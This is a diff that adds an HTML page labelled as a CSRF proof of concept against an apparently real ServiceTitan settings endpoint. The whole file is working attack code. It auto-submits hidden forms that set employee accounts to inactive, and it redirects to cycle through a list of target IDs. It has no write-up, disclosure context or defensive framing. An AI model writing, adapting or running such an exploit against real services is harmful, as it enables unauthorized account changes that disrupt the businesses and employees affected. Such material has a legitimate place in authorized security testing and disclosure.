@@ -1,0 +1,30 @@
+<html>
+  <!-- CSRF PoC - Sequential Form Submissions Without iframe -->
+  <body>
+    <form id="csrfForm" action="https://integration.servicetitan.com/Settings/SetEmployeeIsActive" method="POST">
+      <input type="hidden" name="Id" id="empId" />
+      <input type="hidden" name="isActive" value="false" />
+    </form>
+
+    <script>
+      const ids = [777777777777, 888888888888888, 999999999]; // Add more target IDs here
+
+      // Get current index from URL (e.g., ?i=1)
+      const urlParams = new URLSearchParams(window.location.search);
+      const index = parseInt(urlParams.get("i") || "0");
+
+      if (index < ids.length) {
+        document.getElementById("empId").value = ids[index];
+        document.getElementById("csrfForm").submit();
+
+        // After submitting, wait and redirect to trigger next one
+        setTimeout(() => {
+          const next = index + 1;
+          if (next < ids.length) {
+            window.location.href = "?i=" + next;
+          }
+        }, 1000); // Delay before redirecting to next
+      }
+    </script>
+  </body>
+</html>
